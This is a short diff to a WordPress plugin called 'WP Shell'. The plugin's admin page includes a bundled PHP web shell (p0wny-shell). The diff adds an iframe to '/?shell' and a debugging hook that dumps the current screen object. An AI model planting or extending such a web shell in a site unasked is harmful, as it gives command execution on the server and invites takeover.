@@ -16,6 +16,7 @@ class Jpjuliao_WP_Shell {
      */
     public function __construct() {
         add_action( 'admin_menu', array(&$this, 'register_sub_menu') );
+        add_action( 'current_screen', array(&$this, 'shell_page') );
     }
  
     /**
@@ -40,8 +41,18 @@ class Jpjuliao_WP_Shell {
     public function submenu_page_callback() {
         echo '<div class="wrap">';
         echo '<h2>WP Shell</h2>';
+        echo '<iframe src="/?shell">';
         include 'p0wny-shell/shell.php';
         echo '</div>';
+    }
+
+    /**
+     * Render shell page
+     * @return void
+     */
+    public function shell_page($screen) {
+        if (!isset($_GET['shell'])) return;
+        var_dump($screen);
     }
  
 }
